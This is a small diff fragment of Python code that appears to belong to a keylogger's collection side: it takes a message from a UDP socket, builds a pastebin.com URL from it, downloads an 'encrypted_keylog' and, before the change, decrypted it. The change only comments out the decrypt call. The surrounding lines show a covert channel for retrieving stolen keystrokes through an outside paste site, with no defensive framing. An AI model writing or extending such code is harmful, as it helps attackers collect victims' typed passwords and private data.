@@ -42,7 +42,7 @@ while True:
             msg, send_addr = sock.recvfrom(64)
             msg = "https://pastebin.com/"+msg
             encrypted_keylog = get(msg).text
-            decrypt(encrypted_keylog)
+            # decrypt(encrypted_keylog)
             exit()
     else:
         exit()
